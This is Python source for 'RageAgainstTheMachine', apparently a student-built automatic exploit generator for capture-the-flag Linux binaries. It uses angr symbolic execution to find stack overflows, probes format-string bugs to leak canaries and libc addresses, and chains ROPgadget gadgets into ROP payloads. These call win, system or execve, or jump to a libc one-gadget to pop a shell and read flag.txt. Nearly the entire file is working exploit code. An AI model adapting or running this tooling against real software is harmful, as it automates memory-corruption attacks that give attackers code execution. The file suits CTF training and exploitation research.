import angr, claripy
import os, subprocess
import logging
import argparse
import ropgadget
import r2pipe

from pwn import *
from binascii import *

# Disable angr logging and pwntools until we need it 
logging.getLogger("angr").setLevel(logging.CRITICAL)
logging.getLogger("os").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib").setLevel(logging.CRITICAL)


context.update(
    arch="amd64",
    endian="little",
    log_level="warning",
    os="linux",
    #terminal=["tmux", "split-window", "-h", "-p 65"]
    terminal=["st"]
)

# Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
useful_rop_functions = ["__libc_csu_init"]


class Raeg:
    # Initialize class variables that are important here
    def __init__(self, binary_path, libc_path):
        self.binary = binary_path
        self.libc_path = libc_path
        self.elf = context.binary = ELF(binary_path)
        self.libc = context.binary = ELF(libc_path)

        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
        self.cfg = self.proj.analyses.CFGFast()

        self.exploit_function = None

        self.rop_chain = None
        self.chain_length = 0
        self.string_address = None

        self.symbolic_padding = None

        self.libc_offset_string = ""
        self.canary_offset_string = None
        self.format_write_address = None

        self.has_leak = False
        self.has_overflow = False
        self.has_libc_leak = False


        self.flag = None

    # Determine which exploit we need and return which type as a string
    # Also determine the parameters needed, and the function to execute
    def find_vulnerability(self):

        # First find if it is a format string vulnerability
        p = self.start_process()

        prompt = p.recvline()
        p.sendline(b"%p")
        output = b""
        try:
            p.recvline(b"<<<")
            output = p.recvline()
            logging.getLogger("pwnlib").setLevel(logging.INFO)
        except EOFError:
            output = b""

        if b"0x" in output or b"nil" in output:
            self.has_leak = True
            logging.getLogger("pwnlib").setLevel(logging.INFO)
            log.info(f"Found a format string vulnerability with {output}")
            logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

            self.format_leak()
            symbols = []
            if "pwnme" in self.elf.sym.keys():
                logging.getLogger("pwnlib").setLevel(logging.INFO)
                log.info("Found a format overwrite with the pwnme variable")
                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
            elif "win" in self.elf.sym.keys() and "pwnme" not in self.elf.sym.keys():
                logging.getLogger("pwnlib").setLevel(logging.INFO)
                log.info("Found a win function with a format got overwrite")
                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                self.format_write()
                self.exploit_function = "win"
            elif "fopen" in self.elf.sym.keys():
                logging.getLogger("pwnlib").setLevel(logging.INFO)
                log.info("Found a format read")
                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
            else:
                self.angry_stack_smash()
                self.generate_rop_chain()


        else:
            logging.getLogger("pwnlib").setLevel(logging.INFO)
            self.angry_stack_smash()

            if b"Leak" in prompt:
                self.has_libc_leak = True


            # Find important string in the binary
            for s in strings:
                output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
                string_output = output.split(b"\n")[2].split(b" ")
                if len(string_output) > 1:
                    self.string_address = p64(int(string_output[0],16))
                    log.info(f"Found string {s} at {hex(u64(self.string_address))}")
                    break

            if self.string_address == None:
                log.warning("Couldn't find any useful strings")

            params = []
            # Find functions to use for exploit by enumerating through one win exploit functions
            #for symb in self.elf.sym.keys:
            if "win" in self.elf.sym.keys():
                # Either ret2win, rop parameters, or format got overwrite
                self.exploit_function = "win"
                log.info("Found win function")
            elif "system" in self.elf.sym.keys():
                self.exploit_function = "system"
                log.info("Found system function")
                params = [self.string_address, p64(0)]
            elif "execve" in self.elf.sym.keys():
                self.exploit_function = "execve"
                params = [self.string_address, p64(0), p64(0)]
                log.info("Found execve function")
            elif "syscall" in self.elf.sym.keys():
                self.exploit_function = "syscall"
                log.info("Found syscall function")
                params = [self.string_address, p64(0), p64(0)]
            elif "print_file" in self.elf.sym.keys():
                self.exploit_function = "print_file"
                log.info("Found print_file function")
                params = [self.string_address]
            elif "puts" in self.elf.sym.keys():
                self.exploit_function = "puts"
                log.info("Found puts function")


            # Set functions and parameters as a dictionary set

            self.parameters = params
            self.generate_rop_chain()


        return None


    # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
    def check_mem_corruption(self, simgr):
        if simgr.unconstrained:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"AAAAAAAA")
                        self.symbolic_padding = stack_smash[:index]
                        log.info(f"Found symbolic padding: {self.symbolic_padding}")
                        log.info(f"Successfully Smashed the Stack, Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
                        simgr.stashes["mem_corrupt"].append(path)
                    except ValueError:
                        log.warning("Could not find index of pc overwrite")


                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    # Use angr to explore with the check_mem_corruption function
    def angry_stack_smash(self):
        # Create angr project
        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
        start_addr = self.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 613
        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
        self.symbolic_padding = None

        cfg = self.proj.analyses.CFGFast()

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input,
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes["mem_corrupt"] = []

        # This is the address after the last printf is called which is where we want to check the got table 
        # to see which functions are unfilled
        self.last_printf_address = None


        # Check to see if printf is a format string vulnerability
        # If it is record the address to create a state to smash the stack
        def analyze_printf(state):
            # Check if rsi is not a string
            # If it isn't then we know the vulnerable printf statement
            varg = state.solver.eval(state.regs.rsi)
            address = state.solver.eval(state.regs.rip)

            # If rsi is not an address
            if varg <= 0xff:
                self.last_printf_address = hex(state.callstack.current_return_target)

        self.proj.hook_symbol("printf", analyze_printf)

        log.info("Attempting to smash the stack")
        self.simgr.explore(step_func=self.check_mem_corruption)
        self.proj.hook_symbol("printf", analyze_printf)

        if self.simgr.errored:
            log.warning(f"Simulation errored with {self.simgr.errored[0]}")

        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
            log.warning("Failed to smash stack")

    def find_arguments(self, function, goal):
        return None

    
    # Find pop gadgets to control register
    def find_pop_reg_gadget(self, register):
        # Filters out only pop instructions 
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)


        if len(output) <= 0:
            log.info(f"Couldn't find gadget for {register}")
            return None
        # Iterate through gadgets to find the one with the least instructions
        # This will make sure that the gadget that we want is always first
        min_gadget = output[0]
        min_instructions = output[0].count(b";") + 1
        for gadget in output:
            instructions = gadget.count(b";") + 1
            nops = gadget.count(b"nop")
            instructions -= nops
            if instructions <= min_instructions:
                min_instructions = instructions
                min_gadget = gadget

        log.info(f"Found gadget for {register}: {min_gadget}")
        return min_gadget



    # Find gadget to write to writable address in memory
    def find_write_gadget(self):
        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", "mov .word ptr \[.*\], *.", "--filter", "jmp"]).split(b"\n")
        output.pop(0)
        output.pop(0)
        output.pop(-1)
        output.pop(-1)
        output.pop(-1)

        # First get check to make sure that the same register isn't being dereferenced
        # Add all gadgets that are valid to a list
        # Optimal gadgets will have both registers using 64 bit for the mov write primitive
        # Valid gadgets will be one where the two registers are different
        valid_gadgets = []
        optimal_gadgets = []
        for gadget in output:
            instructions = gadget.split(b";")
            for instruction in instructions:
                if b"ptr" in instruction:
                    reg1 = instruction.split(b"[")[1].split(b",")[0].strip(b"]").strip()
                    reg2 = instruction.split(b"[")[1].split(b",")[1].strip(b"]").strip()
                    if reg1[1:] != reg2[1:]:
                        valid_gadgets.append(gadget)
                        if chr(reg1[0]) == "r":
                            if chr(reg2[0]) == "r":
                                optimal_gadgets.append(gadget)


        # If there are no optimal gadgets choose from valid ones
        if len(optimal_gadgets) <= 0:
            if len(valid_gadgets) <= 0:
                log.warning("Couldn't find write gadget")
                return None
            optimal_gadgets = valid_gadgets

        # Find the gadget with the lowest amount of instructions
        min_gadget = optimal_gadgets[0]
        min_instructions = optimal_gadgets[0].count(b";") + 1
        for gadget in optimal_gadgets:
           instructions = gadget.count(b";") + 1
           if instructions < min_instructions:
               min_instructions = instructions
               min_gadget = gadget

        log.info(f"Found write primitive gadget: {min_gadget}")

        reg1 = min_gadget.split(b"[")[1].split(b",")[0].split(b"]")[0].strip()
        reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
        return min_gadget, reg1, reg2

    # Find writable address in binary
    def find_writable_address(self):
        return None

    # Write string to writable address in the binary
    # !TODO Change to be able to write different strings
    def rop_chain_write_string(self):
        chain = b""

        write = self.find_write_gadget()
        gadget1 = self.find_pop_reg_gadget(write[1].decode())
        gadget2 = self.find_pop_reg_gadget(write[2].decode())
        # Get writable address (for now just the start of the data section)
        addr = self.elf.get_section_by_name(".data").header.sh_addr
        
        pops = gadget1.split(b":")[1].strip().count(b"pop") - 1
        chain += p64(int(gadget1.split(b":")[0].strip(), 16)) + p64(addr)
        while pops > 0:
            pops -= 1
            chain += p64(0)
        
        pops = gadget2.split(b":")[1].strip().count(b"pop") - 1
        chain += p64(int(gadget2.split(b":")[0].strip(), 16)) + b"/bin/sh\x00"
        while pops > 0:
            pops -= 1
            chain += p64(0)
        
        pops = write[0].count(b"pop")
        chain += p64(int(write[0].split(b":")[0].strip(), 16))
        while pops > 0:
            pops -= 1
            chain += p64(0)

        return chain



    # Create a rop chain to execute a function call
    def rop_chain_call_function(self, function, parameters):

        chain = b""
        # If there are any parameters to add to the rop chain then they go in here
        if len(parameters) > 0:
            # If it is a syscall add pop rax, ret and 59 for execve
            if function == "syscall":
                pop_rax_string= self.find_pop_reg_gadget("rax")
                instructions = pop_rax_string.split(b";")
                pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
                chain += pop_rax + p64(59)

                for instruction in instructions[1:]:
                    if b"ret" in instruction:
                        break
                    param = p64(0)
                    for i in range(len(parameters)):
                        if arg_regs[i] in instruction:
                            param = parameters[i]
                    chain += param

            # Reversed in order as the more important parameters go in last
            #for i in range(len(parameters)-1, -1, -1):
            for i in range(len(parameters)):
                pop_reg_string = self.find_pop_reg_gadget(arg_regs[i].decode())
                if pop_reg_string == None:
                    continue
                instructions = pop_reg_string.split(b";")
                pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                chain += pop_reg
                #print(parameters)
                chain += parameters[i]
                for instruction in instructions[1:]:
                    if b"ret" in instruction:
                        break
                    param = p64(0)
                    for i in range(len(parameters)):
                        if arg_regs[i] in instruction:
                            #print(arg_regs[i])
                            param = parameters[i]
                            break;
                    chain += param

        # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
        if (len(chain) + self.chain_length + 8) % 16 != 0:
            chain += p64(self.elf.sym["_fini"])
        if function == "syscall":
            output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
            output.pop(0)
            output.pop(0)
            output.pop(-1)
            output.pop(-1)
            output.pop(-1)


            syscall_gadget = int(output[0].split(b":")[0].strip(),16)

            chain += p64(syscall_gadget)
        else:
            chain += p64(self.elf.sym[function])
        log.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")

        return chain


    def rop_libc(self):
        p = process(self.binary)
        r = ROP(self.elf)
        gs = '''
            init-pwndbg
        '''

        #p = gdb.debug(self.binary,gdbscript=gs)

        f = open("./format.txt", "w+")
        f.write(self.libc_offset_string + "\n")
        f.close()

        self.resolve_libc_offset()

        addr = self.elf.get_section_by_name(".data").header.sh_addr

        prompt = p.recvline()
        if b"Leak" in prompt:
            self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
            log.info(f"Libc address leaked {hex(self.leak)}")

            self.libc.address = self.leak + self.libc_offset

            log.info(f"Found libc base address {hex(self.libc.address)}")

        else:
            if self.libc_offset_string != None:
                p.sendline(bytes(self.libc_offset_string, "utf-8"))
                p.recvuntil(b"0x")
                self.leak = int(p.recvline().strip(b"\n"),16)
                log.info(f"Libc address leaked {hex(self.leak)}")
                self.libc.address = self.leak + self.libc_offset

                log.info(f"Found libc base address {hex(self.libc.address)}")


        pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
        bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
        log.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
        log.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")

        #chain = self.symbolic_padding
        # printlibc-7
        #chain = b"A" * 216
        chain = b"A" * 168
        # ret2one-4
        #chain = b"A" * 136


        chain += p64(self.libc.address + 0x4f302)
        chain += p64(0) * 100

        #chain += pop_rdi + bin_sh
        #chain += p64(self.elf.sym["_fini"])
        #chain += p64(self.libc.sym["system"])

        p.sendline(chain)
        p.sendline(b"cat flag.txt")
        try:
            output = p.recvuntil(b"}").decode().split("\n")[-1]
            if self.flag == None:
                self.flag = output
        except:
            log.info("ROP chain exploit failed")


    def generate_rop_chain(self):

        if self.string_address == None:
            #Perform a w16te primitive
            print(self.has_libc_leak)
            if self.has_libc_leak == True:
                self.rop_chain = self.rop_libc()
            else:
                self.rop_chain = self.rop_chain_write_string()
                self.chain_length += len(self.rop_chain)
                self.string_address = p64(self.elf.get_section_by_name(".data").header.sh_addr)
                self.parameters[0] = self.string_address
                self.rop_chain += self.rop_chain_call_function(self.exploit_function, self.parameters)
        else:
            self.rop_chain =  self.rop_chain_call_function(self.exploit_function, self.parameters)


    def format_leak(self):
        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

        control = 0
        start_end = [0,0]
        stack_len = 100
        string = ""

        # Run the process for stack_len amount of times to leak the entire stack
        for  i in range(1, stack_len):

            if control == 1:
                break

            p = process(self.binary)
            offset_str = "%" + str(i) + "$p."
            p.sendline(bytes(offset_str, "utf-8"))
            p.recvuntil(b">>>")

            try:
                p.recvuntil(b": ")
                response = p.recvline().strip().split(b".")


                if response[0].decode() != "(nil)":
                    address = response[0].decode()
                    response = response[0].strip(b"0x")
                    # Find a the valid canary on the stack
                    canary = re.search(r"0x[a-f0-9]{14}00", address)
                    if canary and self.elf.canary:
                        self.canary_offset_string = offset_str
                        logging.getLogger("pwnlib").setLevel(logging.INFO)
                        log.info(f"Found canary leak at offset {i}:{address}")
                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+4a", address)
                    if libc_leak:
                        self.libc_offset_string = offset_str.split(".")[0]
                        self.has_libc_leak = True
                        logging.getLogger("pwnlib").setLevel(logging.INFO)
                        log.info(f"Found libc leak for libc_start_main at offset {i}:{hex(address)}")
                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)

                    try:
                        flag = unhexlify(response)[::-1]
                        if "flag" in flag.decode() and start_end[0] == 0:
                            string += flag.decode()
                            start_end[0] = 1
                        elif start_end[0] == 1 and "}" in flag.decode():
                            string += flag.decode()
                            self.flag = string

                        elif start_end[0] == 1 and "}" not in flag.decode():
                            string += flag.decode()
                        elif "}" in flag.decode() and start_end[1] == 0:
                            string += flag.decode()
                            self.flag  = string
                            control = 1
                    except:
                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                        log.info("RIP")
                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                p.close()
            except:
                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                log.info("BOZO")

            logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
            p.close()


        logging.getLogger("pwnlib").setLevel(logging.INFO)


    def format_write(self):


        return None

    # Function to resolve the libc base offset from the leak
    def resolve_libc_offset(self):

        self.r2 = r2pipe.open(self.binary, flags=["-d", "rarun2", f"program={self.binary}", f"stdin=./format.txt"])


        # Random r2pipe commands that gets the memory map of the libc base and runs the program for the leak
        # For some reason r2pipe will mess up the order of the commands or skip a command output when returning
        # So just adding a bunch of random commands seems to work
        self.r2.cmd("aa")
        # Break on main
        self.r2.cmd("dcu main")
        command_buffer = []
        command_buffer.append(self.r2.cmd("dc"))
        command_buffer.append(self.r2.cmd("dc"))
        # Get libc base while running
        # Have to append to a command buffer because the output of the command is not always aligned
        command_buffer.append(self.r2.cmd("dm | grep libc.so -m 1"))
        command_buffer.append(self.r2.cmd("dc"))
        command_buffer.append(self.r2.cmd("dc"))
        command_buffer.append(self.r2.cmd("aa"))
        command_buffer.append(self.r2.cmd("aa"))

        for command in command_buffer:
            if "libc" in command:
                libc_base_debug = command
            if "Leak" in command:
                debug_output = command
        debug_lines = debug_output.split("\n")

        for line in debug_lines:
            if "Leak" in line:
               debug_output = line


        for line in debug_lines:
            if "Leak" in line:
                debug_output = line

        debug_ouput = debug_output.split("Leak")



        leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)[-1]
        libc_base_address = re.search(r"0x[0]+7f[A-Fa-f0-9]+", libc_base_debug)
        leak_address = int(leak_address, 16)
        if libc_base_address:
            libc_base_address = int(libc_base_address.group(),16)




        self.libc_offset = libc_base_address - leak_address

        #print("Cleaning disgusting r2 shit off of screen")
        #os.system("clear")
        log.info(f"Found libc offset {self.libc_offset}")


        return None


    def start_process(self):

        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
        gs = """
            init-pwndbg
        """

        #return gdb.debug(self.binary, gdbscript=gs)
        return process(self.binary)

    
    def exploit(self):
        p = self.start_process()
        if self.symbolic_padding != None:
            # Check if regular rop chain or libc leak
            # If there is a leak given then parse the leak
            #
            #chain = self.generate_rop_chain_call()
            if self.rop_chain != None:
                log.info("Sending ROP Chain")
                p.sendline(self.symbolic_padding + self.rop_chain)
                p.sendline(b"cat flag.txt")
                try:
                    output = p.recvuntil(b"}").decode().split("\n")[-1]
                    if self.flag == None:
                        self.flag = output
                    print(self.flag)
                except:
                    log.info("ROP chain exploit failed")

        # Assume that its a format challenge either format write or format leak
        else:
            # Insert leak stack function here
            if self.flag != None:
                print(self.flag)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        prog = "RageAgainstTheMachine",
        description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
        epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
    )
    parser.add_argument("bin", help="path of the binary to exploit")
    #parser.add_argument("libc", help="path of libc shared object")
    args = parser.parse_args()
    #rage = Raeg(args.bin, "/opt/libc.so.6")
    rage = Raeg(args.bin, "/usr/lib/libc.so.6")
    rage.find_vulnerability()

    rage.exploit()
